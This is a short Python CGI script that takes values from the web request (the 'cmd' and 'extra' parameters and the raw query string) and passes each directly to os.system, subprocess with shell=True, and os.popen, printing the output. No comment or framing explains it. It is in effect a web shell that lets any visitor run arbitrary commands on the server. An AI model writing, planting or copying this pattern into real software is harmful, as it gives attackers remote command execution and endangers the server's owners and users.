#!/usr/bin/env python3
import cgi
import os
import subprocess

form = cgi.FieldStorage()
command = form.getvalue("cmd", "uptime")
print("Content-Type: text/plain\n")
~>os.system(command)
~>out = subprocess.check_output(form.getvalue("extra"), shell=True)
~>print(os.popen(os.environ["QUERY_STRING"]).read())
